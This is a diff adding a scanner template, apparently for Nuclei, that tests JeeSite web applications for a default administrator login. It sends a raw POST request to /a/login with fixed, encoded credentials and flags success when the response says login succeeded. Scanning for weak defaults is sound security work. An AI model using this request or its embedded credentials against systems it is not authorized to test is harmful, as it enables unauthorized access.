@@ -1,0 +1,30 @@
+id: JeeSite-default-login
+info:
+  author: Str1am
+  name: "JeeSite\u9ED8\u8BA4\u5BC6\u7801"
+  severity: high
+  tags: JeeSite,login
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - "\u767B\u5F55\u6210\u529F"
+  matchers-condition: and
+  raw:
+  - 'POST /a/login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    X-Requested-With: XMLHttpRequest
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+
+    username=F3EDC7D2C193E0B8DCF554C726719ED2&password=235880C505ACCDA5C581A4F4CDB81DA0&validCode=
+
+    '
